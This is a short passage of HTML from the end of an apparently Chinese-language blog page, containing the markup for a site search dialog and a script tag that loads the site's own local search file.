})</script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.3"></script></div></div></body></html>